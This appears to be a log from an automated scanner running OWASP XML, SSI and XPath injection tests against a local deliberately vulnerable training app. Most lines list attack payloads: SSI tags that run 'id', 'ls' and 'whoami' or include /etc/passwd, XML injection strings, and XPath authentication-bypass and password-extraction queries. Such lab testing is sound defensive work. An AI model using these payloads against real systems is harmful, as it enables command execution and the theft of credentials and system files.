+2025-08-05 01:12:04.079501 |     [!] Possible XML processing with payload '</username><userid>0</userid><username>'
+2025-08-05 01:12:04.079501 |     [!] Possible XML injection - XML response with payload '</username><userid>0</userid><username>'
+2025-08-05 01:12:04.084039 |     [!] Possible XML processing with payload '<mail>attacker@evil.com</mail><!--'
+2025-08-05 01:12:04.084039 |     [!] Possible XML injection - XML response with payload '<mail>attacker@evil.com</mail><!--'
+2025-08-05 01:12:04.089165 |     [!] Possible XML processing with payload '--><userid>0</userid><mail>'
+2025-08-05 01:12:04.089165 |     [!] Possible XML injection - XML response with payload '--><userid>0</userid><mail>'
+2025-08-05 01:12:04.089165 | ----- OTG-INPVAL-008 Test Completed -----
+
+2025-08-05 01:12:04.089165 | ----- Starting OTG-INPVAL-009 (SSI Injection) -----
+2025-08-05 01:12:04.089165 | 
+[i] Testing URL: http://localhost:8080/vulnerabilities/xss_r/
+2025-08-05 01:12:04.094181 |   - Testing parameter: name
+2025-08-05 01:12:04.099098 |     [✓] Possible environment variable leak with payload '<!--#echo var='DOCUMENT_NAME'-->'
+2025-08-05 01:12:04.102648 |     [✓] Possible environment variable leak with payload '<!--#echo var='DOCUMENT_URI'-->'
+2025-08-05 01:12:04.107143 |     [✓] SSI tag reflected with payload '<!--#include virtual='/etc/passwd'-->'
+2025-08-05 01:12:04.111663 |     [✓] SSI tag reflected with payload '<!--#include file='/etc/passwd'-->'
+2025-08-05 01:12:04.114225 |     [✓] SSI tag reflected with payload '<!--#exec cmd='ls'-->'
+2025-08-05 01:12:04.122348 |     [✓] SSI tag reflected with payload '<!--#exec cmd='id'-->'
+2025-08-05 01:12:04.125986 |     [✓] SSI tag reflected with payload '<!--#echo var='DATE_LOCAL' --'
+2025-08-05 01:12:04.130789 |     [✓] SSI tag reflected with payload '<!--#include virtual='/etc/passwd' --'
+2025-08-05 01:12:04.136276 |     [!] Possible SSI injection - SSI error with payload '#exec cmd='whoami''
+2025-08-05 01:12:04.140119 |     [✓] SSI tag reflected with payload '<!--#printenv -->'
+2025-08-05 01:12:04.144215 |     [✓] SSI tag reflected with payload '<!--#echo var='REMOTE_ADDR'-->'
+2025-08-05 01:12:04.147421 |     [✓] SSI tag reflected with payload '<!--#fsize file='/etc/passwd'-->'
+2025-08-05 01:12:04.150986 |     [✓] SSI tag reflected with payload '<!--#flastmod file='/etc/passwd'-->'
+2025-08-05 01:12:04.154473 |     [✓] SSI tag reflected with payload '<!--#if expr='test' -->Injected<!--#endif -->'
+2025-08-05 01:12:04.158028 |     [✓] SSI tag reflected with payload '<!--#cookie name='USER_COOKIE'-->'
+2025-08-05 01:12:04.161450 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='DOCUMENT_NAME'-->'
+2025-08-05 01:12:04.164161 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='DOCUMENT_URI'-->'
+2025-08-05 01:12:04.166280 |     [!] Possible SSI injection - SSI error with payload '<!--#include virtual='/etc/passwd'-->'
+2025-08-05 01:12:04.166280 |     [!] Possible SSI injection - SSI error with payload '<!--#include file='/etc/passwd'-->'
+2025-08-05 01:12:04.174727 |     [!] Possible SSI injection - SSI error with payload '<!--#exec cmd='ls'-->'
+2025-08-05 01:12:04.176382 |     [!] Possible SSI injection - SSI error with payload '<!--#exec cmd='id'-->'
+2025-08-05 01:12:04.176382 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='DATE_LOCAL' --'
+2025-08-05 01:12:04.184273 |     [!] Possible SSI injection - SSI error with payload '<!--#include virtual='/etc/passwd' --'
+2025-08-05 01:12:04.185874 |     [!] Possible SSI injection - SSI error with payload '#exec cmd='whoami''
+2025-08-05 01:12:04.193146 |     [!] Possible SSI injection - SSI error with payload '<!--#printenv -->'
+2025-08-05 01:12:04.197445 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='REMOTE_ADDR'-->'
+2025-08-05 01:12:04.202056 |     [!] Possible SSI injection - SSI error with payload '<!--#fsize file='/etc/passwd'-->'
+2025-08-05 01:12:04.206335 |     [!] Possible SSI injection - SSI error with payload '<!--#flastmod file='/etc/passwd'-->'
+2025-08-05 01:12:04.209922 |     [!] Possible SSI injection - SSI error with payload '<!--#if expr='test' -->Injected<!--#endif -->'
+2025-08-05 01:12:04.213798 |     [!] Possible SSI injection - SSI error with payload '<!--#cookie name='USER_COOKIE'-->'
+2025-08-05 01:12:04.213798 | 
+[i] Testing URL: http://localhost:8080/vulnerabilities/xss_s/
+2025-08-05 01:12:04.225199 |   - Testing parameter: txtName
+2025-08-05 01:12:04.288858 |     [✓] Possible environment variable leak with payload '<!--#echo var='DOCUMENT_NAME'-->'
+2025-08-05 01:12:04.352236 |     [✓] Possible environment variable leak with payload '<!--#echo var='DOCUMENT_URI'-->'
+2025-08-05 01:12:04.415549 |     [✓] SSI tag reflected with payload '<!--#include virtual='/etc/passwd'-->'
+2025-08-05 01:12:04.478338 |     [✓] SSI tag reflected with payload '<!--#include file='/etc/passwd'-->'
+2025-08-05 01:12:04.539461 |     [✓] SSI tag reflected with payload '<!--#exec cmd='ls'-->'
+2025-08-05 01:12:04.593809 |     [✓] SSI tag reflected with payload '<!--#exec cmd='id'-->'
+2025-08-05 01:12:04.661131 |     [✓] SSI tag reflected with payload '<!--#echo var='DATE_LOCAL' --'
+2025-08-05 01:12:04.723301 |     [✓] SSI tag reflected with payload '<!--#include virtual='/etc/passwd' --'
+2025-08-05 01:12:04.783829 |     [!] Possible SSI injection - SSI error with payload '#exec cmd='whoami''
+2025-08-05 01:12:04.843999 |     [✓] SSI tag reflected with payload '<!--#printenv -->'
+2025-08-05 01:12:04.904257 |     [✓] SSI tag reflected with payload '<!--#echo var='REMOTE_ADDR'-->'
+2025-08-05 01:12:04.965628 |     [✓] SSI tag reflected with payload '<!--#fsize file='/etc/passwd'-->'
+2025-08-05 01:12:05.022224 |     [✓] SSI tag reflected with payload '<!--#flastmod file='/etc/passwd'-->'
+2025-08-05 01:12:05.084837 |     [✓] SSI tag reflected with payload '<!--#if expr='test' -->Injected<!--#endif -->'
+2025-08-05 01:12:05.144022 |     [✓] SSI tag reflected with payload '<!--#cookie name='USER_COOKIE'-->'
+2025-08-05 01:12:05.145783 |   - Testing parameter: btnSign
+2025-08-05 01:12:05.206183 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='DOCUMENT_NAME'-->'
+2025-08-05 01:12:05.265413 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='DOCUMENT_URI'-->'
+2025-08-05 01:12:05.324160 |     [!] Possible SSI injection - SSI error with payload '<!--#include virtual='/etc/passwd'-->'
+2025-08-05 01:12:05.383991 |     [!] Possible SSI injection - SSI error with payload '<!--#include file='/etc/passwd'-->'
+2025-08-05 01:12:05.442750 |     [!] Possible SSI injection - SSI error with payload '<!--#exec cmd='ls'-->'
+2025-08-05 01:12:05.503915 |     [!] Possible SSI injection - SSI error with payload '<!--#exec cmd='id'-->'
+2025-08-05 01:12:05.566536 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='DATE_LOCAL' --'
+2025-08-05 01:12:05.627395 |     [!] Possible SSI injection - SSI error with payload '<!--#include virtual='/etc/passwd' --'
+2025-08-05 01:12:05.693988 |     [!] Possible SSI injection - SSI error with payload '#exec cmd='whoami''
+2025-08-05 01:12:05.754118 |     [!] Possible SSI injection - SSI error with payload '<!--#printenv -->'
+2025-08-05 01:12:05.813891 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='REMOTE_ADDR'-->'
+2025-08-05 01:12:05.876966 |     [!] Possible SSI injection - SSI error with payload '<!--#fsize file='/etc/passwd'-->'
+2025-08-05 01:12:05.934066 |     [!] Possible SSI injection - SSI error with payload '<!--#flastmod file='/etc/passwd'-->'
+2025-08-05 01:12:05.994065 |     [!] Possible SSI injection - SSI error with payload '<!--#if expr='test' -->Injected<!--#endif -->'
+2025-08-05 01:12:06.053938 |     [!] Possible SSI injection - SSI error with payload '<!--#cookie name='USER_COOKIE'-->'
+2025-08-05 01:12:06.053938 |   - Testing parameter: btnClear
+2025-08-05 01:12:06.121093 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='DOCUMENT_NAME'-->'
+2025-08-05 01:12:06.180248 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='DOCUMENT_URI'-->'
+2025-08-05 01:12:06.244251 |     [!] Possible SSI injection - SSI error with payload '<!--#include virtual='/etc/passwd'-->'
+2025-08-05 01:12:06.304009 |     [!] Possible SSI injection - SSI error with payload '<!--#include file='/etc/passwd'-->'
+2025-08-05 01:12:06.367093 |     [!] Possible SSI injection - SSI error with payload '<!--#exec cmd='ls'-->'
+2025-08-05 01:12:06.428067 |     [!] Possible SSI injection - SSI error with payload '<!--#exec cmd='id'-->'
+2025-08-05 01:12:06.483997 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='DATE_LOCAL' --'
+2025-08-05 01:12:06.543846 |     [!] Possible SSI injection - SSI error with payload '<!--#include virtual='/etc/passwd' --'
+2025-08-05 01:12:06.604011 |     [!] Possible SSI injection - SSI error with payload '#exec cmd='whoami''
+2025-08-05 01:12:06.667195 |     [!] Possible SSI injection - SSI error with payload '<!--#printenv -->'
+2025-08-05 01:12:06.730534 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='REMOTE_ADDR'-->'
+2025-08-05 01:12:06.792753 |     [!] Possible SSI injection - SSI error with payload '<!--#fsize file='/etc/passwd'-->'
+2025-08-05 01:12:06.850573 |     [!] Possible SSI injection - SSI error with payload '<!--#flastmod file='/etc/passwd'-->'
+2025-08-05 01:12:06.917181 |     [!] Possible SSI injection - SSI error with payload '<!--#if expr='test' -->Injected<!--#endif -->'
+2025-08-05 01:12:06.978811 |     [!] Possible SSI injection - SSI error with payload '<!--#cookie name='USER_COOKIE'-->'
+2025-08-05 01:12:06.982908 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='DOCUMENT_NAME'-->'
+2025-08-05 01:12:06.983920 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='DOCUMENT_URI'-->'
+2025-08-05 01:12:06.988952 |     [!] Possible SSI injection - SSI error with payload '<!--#include virtual='/etc/passwd'-->'
+2025-08-05 01:12:06.993984 |     [!] Possible SSI injection - SSI error with payload '<!--#include file='/etc/passwd'-->'
+2025-08-05 01:12:06.993984 |     [!] Possible SSI injection - SSI error with payload '<!--#exec cmd='ls'-->'
+2025-08-05 01:12:07.000696 |     [!] Possible SSI injection - SSI error with payload '<!--#exec cmd='id'-->'
+2025-08-05 01:12:07.004246 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='DATE_LOCAL' --'
+2025-08-05 01:12:07.004246 |     [!] Possible SSI injection - SSI error with payload '<!--#include virtual='/etc/passwd' --'
+2025-08-05 01:12:07.009301 |     [!] Possible SSI injection - SSI error with payload '#exec cmd='whoami''
+2025-08-05 01:12:07.009301 |     [!] Possible SSI injection - SSI error with payload '<!--#printenv -->'
+2025-08-05 01:12:07.014314 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='REMOTE_ADDR'-->'
+2025-08-05 01:12:07.018961 |     [!] Possible SSI injection - SSI error with payload '<!--#fsize file='/etc/passwd'-->'
+2025-08-05 01:12:07.024281 |     [!] Possible SSI injection - SSI error with payload '<!--#flastmod file='/etc/passwd'-->'
+2025-08-05 01:12:07.028115 |     [!] Possible SSI injection - SSI error with payload '<!--#if expr='test' -->Injected<!--#endif -->'
+2025-08-05 01:12:07.030739 |     [!] Possible SSI injection - SSI error with payload '<!--#cookie name='USER_COOKIE'-->'
+2025-08-05 01:12:07.030739 | 
+[i] Testing URL: http://localhost:8080/vulnerabilities/exec/
+2025-08-05 01:12:07.034331 |   - Testing parameter: ip
+2025-08-05 01:12:07.099491 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='DOCUMENT_NAME'-->'
+2025-08-05 01:12:07.154035 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='DOCUMENT_URI'-->'
+2025-08-05 01:12:07.209208 |     [!] Possible SSI injection - SSI error with payload '<!--#include virtual='/etc/passwd'-->'
+2025-08-05 01:12:07.262352 |     [!] Possible SSI injection - SSI error with payload '<!--#include file='/etc/passwd'-->'
+2025-08-05 01:12:07.316699 |     [!] Possible SSI injection - SSI error with payload '<!--#exec cmd='ls'-->'
+2025-08-05 01:12:07.365478 |     [!] Possible SSI injection - SSI error with payload '<!--#exec cmd='id'-->'
+2025-08-05 01:12:07.424283 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='DATE_LOCAL' --'
+2025-08-05 01:12:07.480757 |     [!] Possible SSI injection - SSI error with payload '<!--#include virtual='/etc/passwd' --'
+2025-08-05 01:12:07.537548 |     [!] Possible SSI injection - SSI error with payload '#exec cmd='whoami''
+2025-08-05 01:12:07.586479 |     [!] Possible SSI injection - SSI error with payload '<!--#printenv -->'
+2025-08-05 01:12:07.644235 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='REMOTE_ADDR'-->'
+2025-08-05 01:12:07.700971 |     [!] Possible SSI injection - SSI error with payload '<!--#fsize file='/etc/passwd'-->'
+2025-08-05 01:12:07.756206 |     [!] Possible SSI injection - SSI error with payload '<!--#flastmod file='/etc/passwd'-->'
+2025-08-05 01:12:07.810522 |     [!] Possible SSI injection - SSI error with payload '<!--#if expr='test' -->Injected<!--#endif -->'
+2025-08-05 01:12:07.864209 |     [!] Possible SSI injection - SSI error with payload '<!--#cookie name='USER_COOKIE'-->'
+2025-08-05 01:12:07.864209 |   - Testing parameter: Submit
+2025-08-05 01:12:07.919001 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='DOCUMENT_NAME'-->'
+2025-08-05 01:12:07.974342 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='DOCUMENT_URI'-->'
+2025-08-05 01:12:08.031692 |     [!] Possible SSI injection - SSI error with payload '<!--#include virtual='/etc/passwd'-->'
+2025-08-05 01:12:08.086177 |     [!] Possible SSI injection - SSI error with payload '<!--#include file='/etc/passwd'-->'
+2025-08-05 01:12:08.139944 |     [!] Possible SSI injection - SSI error with payload '<!--#exec cmd='ls'-->'
+2025-08-05 01:12:08.195303 |     [!] Possible SSI injection - SSI error with payload '<!--#exec cmd='id'-->'
+2025-08-05 01:12:08.249935 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='DATE_LOCAL' --'
+2025-08-05 01:12:08.303966 |     [!] Possible SSI injection - SSI error with payload '<!--#include virtual='/etc/passwd' --'
+2025-08-05 01:12:08.354344 |     [!] Possible SSI injection - SSI error with payload '#exec cmd='whoami''
+2025-08-05 01:12:08.414323 |     [!] Possible SSI injection - SSI error with payload '<!--#printenv -->'
+2025-08-05 01:12:08.466177 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='REMOTE_ADDR'-->'
+2025-08-05 01:12:08.524202 |     [!] Possible SSI injection - SSI error with payload '<!--#fsize file='/etc/passwd'-->'
+2025-08-05 01:12:08.574888 |     [!] Possible SSI injection - SSI error with payload '<!--#flastmod file='/etc/passwd'-->'
+2025-08-05 01:12:08.634183 |     [!] Possible SSI injection - SSI error with payload '<!--#if expr='test' -->Injected<!--#endif -->'
+2025-08-05 01:12:08.686050 |     [!] Possible SSI injection - SSI error with payload '<!--#cookie name='USER_COOKIE'-->'
+2025-08-05 01:12:08.686050 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='DOCUMENT_NAME'-->'
+2025-08-05 01:12:08.694153 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='DOCUMENT_URI'-->'
+2025-08-05 01:12:08.699204 |     [!] Possible SSI injection - SSI error with payload '<!--#include virtual='/etc/passwd'-->'
+2025-08-05 01:12:08.701739 |     [!] Possible SSI injection - SSI error with payload '<!--#include file='/etc/passwd'-->'
+2025-08-05 01:12:08.704247 |     [!] Possible SSI injection - SSI error with payload '<!--#exec cmd='ls'-->'
+2025-08-05 01:12:08.709280 |     [!] Possible SSI injection - SSI error with payload '<!--#exec cmd='id'-->'
+2025-08-05 01:12:08.709280 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='DATE_LOCAL' --'
+2025-08-05 01:12:08.714291 |     [!] Possible SSI injection - SSI error with payload '<!--#include virtual='/etc/passwd' --'
+2025-08-05 01:12:08.719042 |     [!] Possible SSI injection - SSI error with payload '#exec cmd='whoami''
+2025-08-05 01:12:08.724053 |     [!] Possible SSI injection - SSI error with payload '<!--#printenv -->'
+2025-08-05 01:12:08.727423 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='REMOTE_ADDR'-->'
+2025-08-05 01:12:08.727423 |     [!] Possible SSI injection - SSI error with payload '<!--#fsize file='/etc/passwd'-->'
+2025-08-05 01:12:08.731653 |     [!] Possible SSI injection - SSI error with payload '<!--#flastmod file='/etc/passwd'-->'
+2025-08-05 01:12:08.735720 |     [!] Possible SSI injection - SSI error with payload '<!--#if expr='test' -->Injected<!--#endif -->'
+2025-08-05 01:12:08.738819 |     [!] Possible SSI injection - SSI error with payload '<!--#cookie name='USER_COOKIE'-->'
+2025-08-05 01:12:08.739825 | 
+[i] Testing URL: http://localhost:8080/vulnerabilities/sqli/
+2025-08-05 01:12:08.744189 |   - Testing parameter: id
+2025-08-05 01:12:08.748530 |     [✓] Possible environment variable leak with payload '<!--#echo var='DOCUMENT_NAME'-->'
+2025-08-05 01:12:08.752422 |     [✓] Possible environment variable leak with payload '<!--#echo var='DOCUMENT_URI'-->'
+2025-08-05 01:12:08.755573 |     [-] No obvious SSI injection with payload '<!--#include virtual='/etc/passwd'-->'
+2025-08-05 01:12:08.758713 |     [-] No obvious SSI injection with payload '<!--#include file='/etc/passwd'-->'
+2025-08-05 01:12:08.761839 |     [-] No obvious SSI injection with payload '<!--#exec cmd='ls'-->'
+2025-08-05 01:12:08.763880 |     [-] No obvious SSI injection with payload '<!--#exec cmd='id'-->'
+2025-08-05 01:12:08.767010 |     [-] No obvious SSI injection with payload '<!--#echo var='DATE_LOCAL' --'
+2025-08-05 01:12:08.767010 |     [-] No obvious SSI injection with payload '<!--#include virtual='/etc/passwd' --'
+2025-08-05 01:12:08.774214 |     [-] No obvious SSI injection with payload '#exec cmd='whoami''
+2025-08-05 01:12:08.774214 |     [!] Possible SSI injection - SSI error with payload '<!--#printenv -->'
+2025-08-05 01:12:08.774214 |     [-] No obvious SSI injection with payload '<!--#echo var='REMOTE_ADDR'-->'
+2025-08-05 01:12:08.782934 |     [-] No obvious SSI injection with payload '<!--#fsize file='/etc/passwd'-->'
+2025-08-05 01:12:08.783953 |     [-] No obvious SSI injection with payload '<!--#flastmod file='/etc/passwd'-->'
+2025-08-05 01:12:08.789000 |     [✓] SSI tag reflected with payload '<!--#if expr='test' -->Injected<!--#endif -->'
+2025-08-05 01:12:08.789000 |     [-] No obvious SSI injection with payload '<!--#cookie name='USER_COOKIE'-->'
+2025-08-05 01:12:08.789000 |   - Testing parameter: Submit
+2025-08-05 01:12:08.793963 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='DOCUMENT_NAME'-->'
+2025-08-05 01:12:08.793963 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='DOCUMENT_URI'-->'
+2025-08-05 01:12:08.798346 |     [!] Possible SSI injection - SSI error with payload '<!--#include virtual='/etc/passwd'-->'
+2025-08-05 01:12:08.804027 |     [!] Possible SSI injection - SSI error with payload '<!--#include file='/etc/passwd'-->'
+2025-08-05 01:12:08.804027 |     [!] Possible SSI injection - SSI error with payload '<!--#exec cmd='ls'-->'
+2025-08-05 01:12:08.809114 |     [!] Possible SSI injection - SSI error with payload '<!--#exec cmd='id'-->'
+2025-08-05 01:12:08.809114 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='DATE_LOCAL' --'
+2025-08-05 01:12:08.813909 |     [!] Possible SSI injection - SSI error with payload '<!--#include virtual='/etc/passwd' --'
+2025-08-05 01:12:08.818982 |     [!] Possible SSI injection - SSI error with payload '#exec cmd='whoami''
+2025-08-05 01:12:08.818982 |     [!] Possible SSI injection - SSI error with payload '<!--#printenv -->'
+2025-08-05 01:12:08.824009 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='REMOTE_ADDR'-->'
+2025-08-05 01:12:08.824009 |     [!] Possible SSI injection - SSI error with payload '<!--#fsize file='/etc/passwd'-->'
+2025-08-05 01:12:08.829691 |     [!] Possible SSI injection - SSI error with payload '<!--#flastmod file='/etc/passwd'-->'
+2025-08-05 01:12:08.835775 |     [!] Possible SSI injection - SSI error with payload '<!--#if expr='test' -->Injected<!--#endif -->'
+2025-08-05 01:12:08.835775 |     [!] Possible SSI injection - SSI error with payload '<!--#cookie name='USER_COOKIE'-->'
+2025-08-05 01:12:08.835775 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='DOCUMENT_NAME'-->'
+2025-08-05 01:12:08.844246 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='DOCUMENT_URI'-->'
+2025-08-05 01:12:08.845773 |     [!] Possible SSI injection - SSI error with payload '<!--#include virtual='/etc/passwd'-->'
+2025-08-05 01:12:08.845773 |     [!] Possible SSI injection - SSI error with payload '<!--#include file='/etc/passwd'-->'
+2025-08-05 01:12:08.853893 |     [!] Possible SSI injection - SSI error with payload '<!--#exec cmd='ls'-->'
+2025-08-05 01:12:08.853893 |     [!] Possible SSI injection - SSI error with payload '<!--#exec cmd='id'-->'
+2025-08-05 01:12:08.858938 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='DATE_LOCAL' --'
+2025-08-05 01:12:08.862666 |     [!] Possible SSI injection - SSI error with payload '<!--#include virtual='/etc/passwd' --'
+2025-08-05 01:12:08.864211 |     [!] Possible SSI injection - SSI error with payload '#exec cmd='whoami''
+2025-08-05 01:12:08.869254 |     [!] Possible SSI injection - SSI error with payload '<!--#printenv -->'
+2025-08-05 01:12:08.869254 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='REMOTE_ADDR'-->'
+2025-08-05 01:12:08.874266 |     [!] Possible SSI injection - SSI error with payload '<!--#fsize file='/etc/passwd'-->'
+2025-08-05 01:12:08.877299 |     [!] Possible SSI injection - SSI error with payload '<!--#flastmod file='/etc/passwd'-->'
+2025-08-05 01:12:08.877299 |     [!] Possible SSI injection - SSI error with payload '<!--#if expr='test' -->Injected<!--#endif -->'
+2025-08-05 01:12:08.884157 |     [!] Possible SSI injection - SSI error with payload '<!--#cookie name='USER_COOKIE'-->'
+2025-08-05 01:12:08.884157 | 
+[i] Testing HTTP headers for SSI injection
+2025-08-05 01:12:08.884157 |     [!] Possible SSI injection - SSI error with payload '<!--#exec cmd='id'-->' (header Referer)
+2025-08-05 01:12:08.884157 |     [!] Possible SSI injection - SSI error with payload '<!--#include virtual='/etc/passwd'-->' (header User-Agent)
+2025-08-05 01:12:08.884157 |     [!] Possible SSI injection - SSI error with payload '<!--#echo var='DOCUMENT_NAME'-->' (header X-Forwarded-For)
+2025-08-05 01:12:08.884157 | ----- OTG-INPVAL-009 Test Completed -----
+
+2025-08-05 01:12:08.893247 | ----- Starting OTG-INPVAL-010 (XPath Injection) -----
+2025-08-05 01:12:08.893247 | 
+[i] Testing URL: http://localhost:8080/vulnerabilities/sqli/
+2025-08-05 01:12:08.894254 |   - Testing parameter: id
+2025-08-05 01:12:08.894254 |     [✓] Possible XML/XPath processing with payload '' or '1'='1'
+2025-08-05 01:12:08.904251 |     [✓] Possible XML/XPath processing with payload '' or ''=''
+2025-08-05 01:12:08.910253 |     [!] XPath payload partially reflected with '') or ('1'='1'
+2025-08-05 01:12:08.914576 |     [✓] Possible XML/XPath processing with payload '' or 1=1 or ''=''
+2025-08-05 01:12:08.918809 |     [-] No obvious XPath injection with payload '' or position()=1 or ''=''
+2025-08-05 01:12:08.922664 |     [-] No obvious XPath injection with payload '' or count(/*)=1 or ''=''
+2025-08-05 01:12:08.925489 |     [-] No obvious XPath injection with payload '' or string-length(name(/*[1]))=4 or ''=''
+2025-08-05 01:12:08.929218 |     [-] No obvious XPath injection with payload '' and count(/*)=1 and '1'='1'
+2025-08-05 01:12:08.933476 |     [-] No obvious XPath injection with payload '' and string-length(name(/*[1]))=4 and '1'='1'
+2025-08-05 01:12:08.936598 |     [-] No obvious XPath injection with payload '' or count(/*)=''
+2025-08-05 01:12:08.939331 |     [-] No obvious XPath injection with payload '' or contains(name(/*[1]),'x') or ''=''
+2025-08-05 01:12:08.940477 |     [✓] Possible user data exposure with payload '' or //user[position()=1]/username | //user[position()=1]/password or ''=''
+2025-08-05 01:12:08.940477 |   - Testing parameter: Submit
+2025-08-05 01:12:08.946605 |     [✓] Possible XML/XPath processing with payload '' or '1'='1'
+2025-08-05 01:12:08.947983 |     [✓] Possible XML/XPath processing with payload '' or ''=''
+2025-08-05 01:12:08.954002 |     [✓] Possible XML/XPath processing with payload '') or ('1'='1'
+2025-08-05 01:12:08.954002 |     [✓] Possible XML/XPath processing with payload '' or 1=1 or ''=''
+2025-08-05 01:12:08.960227 |     [✓] Possible XML/XPath processing with payload '' or position()=1 or ''=''
+2025-08-05 01:12:08.963233 |     [✓] Possible XML/XPath processing with payload '' or count(/*)=1 or ''=''
+2025-08-05 01:12:08.966544 |     [✓] Possible XML/XPath processing with payload '' or string-length(name(/*[1]))=4 or ''=''
+2025-08-05 01:12:08.967103 |     [✓] Possible XML/XPath processing with payload '' and count(/*)=1 and '1'='1'
+2025-08-05 01:12:08.967103 |     [✓] Possible XML/XPath processing with payload '' and string-length(name(/*[1]))=4 and '1'='1'
+2025-08-05 01:12:08.974197 |     [✓] Possible XML/XPath processing with payload '' or count(/*)=''
+2025-08-05 01:12:08.979240 |     [✓] Possible XML/XPath processing with payload '' or contains(name(/*[1]),'x') or ''=''
+2025-08-05 01:12:08.982387 |     [✓] Possible XML/XPath processing with payload '' or //user[position()=1]/username | //user[position()=1]/password or ''=''
+2025-08-05 01:12:08.982387 | 
+[i] Testing URL: http://localhost:8080/vulnerabilities/brute/
+2025-08-05 01:12:08.983902 |   - Testing parameter: username
+2025-08-05 01:12:08.988928 |     [✓] Possible XML/XPath processing with payload '' or '1'='1'
+2025-08-05 01:12:08.993937 |     [✓] Possible XML/XPath processing with payload '' or ''=''
+2025-08-05 01:12:08.993937 |     [✓] Possible password data exposure with payload '') or ('1'='1'
+2025-08-05 01:12:08.997970 |     [✓] Possible XML/XPath processing with payload '' or 1=1 or ''=''
+2025-08-05 01:12:09.004067 |     [✓] Possible password data exposure with payload '' or position()=1 or ''=''
+2025-08-05 01:12:09.004067 |     [✓] Possible password data exposure with payload '' or count(/*)=1 or ''=''
+2025-08-05 01:12:09.010079 |     [✓] Possible password data exposure with payload '' or string-length(name(/*[1]))=4 or ''=''
+2025-08-05 01:12:09.014056 |     [✓] Possible password data exposure with payload '' and count(/*)=1 and '1'='1'
+2025-08-05 01:12:09.017454 |     [✓] Possible password data exposure with payload '' and string-length(name(/*[1]))=4 and '1'='1'
+2025-08-05 01:12:09.021420 |     [✓] Possible password data exposure with payload '' or count(/*)=''
+2025-08-05 01:12:09.024743 |     [✓] Possible password data exposure with payload '' or contains(name(/*[1]),'x') or ''=''
+2025-08-05 01:12:09.027357 |     [✓] Possible user data exposure with payload '' or //user[position()=1]/username | //user[position()=1]/password or ''=''
+2025-08-05 01:12:09.027880 |   - Testing parameter: password
+2025-08-05 01:12:09.031691 |     [✓] Possible XML/XPath processing with payload '' or '1'='1'
+2025-08-05 01:12:09.034196 |     [✓] Possible XML/XPath processing with payload '' or ''=''
+2025-08-05 01:12:09.038779 |     [✓] Possible XML/XPath processing with payload '') or ('1'='1'
+2025-08-05 01:12:09.041776 |     [✓] Possible XML/XPath processing with payload '' or 1=1 or ''=''
+2025-08-05 01:12:09.045211 |     [✓] Possible XML/XPath processing with payload '' or position()=1 or ''=''
+2025-08-05 01:12:09.048213 |     [✓] Possible XML/XPath processing with payload '' or count(/*)=1 or ''=''
+2025-08-05 01:12:09.051213 |     [✓] Possible XML/XPath processing with payload '' or string-length(name(/*[1]))=4 or ''=''
+2025-08-05 01:12:09.054281 |     [✓] Possible XML/XPath processing with payload '' and count(/*)=1 and '1'='1'
+2025-08-05 01:12:09.059472 |     [✓] Possible XML/XPath processing with payload '' and string-length(name(/*[1]))=4 and '1'='1'
+2025-08-05 01:12:09.064044 |     [✓] Possible XML/XPath processing with payload '' or count(/*)=''
+2025-08-05 01:12:09.067495 |     [✓] Possible XML/XPath processing with payload '' or contains(name(/*[1]),'x') or ''=''
+2025-08-05 01:12:09.071197 |     [✓] Possible XML/XPath processing with payload '' or //user[position()=1]/username | //user[position()=1]/password or ''=''
+2025-08-05 01:12:09.071197 |   - Testing parameter: Login
+2025-08-05 01:12:09.074814 |     [✓] Possible XML/XPath processing with payload '' or '1'='1'
+2025-08-05 01:12:09.077818 |     [✓] Possible XML/XPath processing with payload '' or ''=''
+2025-08-05 01:12:09.078151 |     [✓] Possible XML/XPath processing with payload '') or ('1'='1'
+2025-08-05 01:12:09.084310 |     [✓] Possible XML/XPath processing with payload '' or 1=1 or ''=''
+2025-08-05 01:12:09.085665 |     [✓] Possible XML/XPath processing with payload '' or position()=1 or ''=''
+2025-08-05 01:12:09.085665 |     [✓] Possible XML/XPath processing with payload '' or count(/*)=1 or ''=''
+2025-08-05 01:12:09.094123 |     [✓] Possible XML/XPath processing with payload '' or string-length(name(/*[1]))=4 or ''=''
+2025-08-05 01:12:09.098157 |     [✓] Possible XML/XPath processing with payload '' and count(/*)=1 and '1'='1'
+2025-08-05 01:12:09.100243 |     [✓] Possible XML/XPath processing with payload '' and string-length(name(/*[1]))=4 and '1'='1'
+2025-08-05 01:12:09.104261 |     [✓] Possible XML/XPath processing with payload '' or count(/*)=''
+2025-08-05 01:12:09.109328 |     [✓] Possible XML/XPath processing with payload '' or contains(name(/*[1]),'x') or ''=''
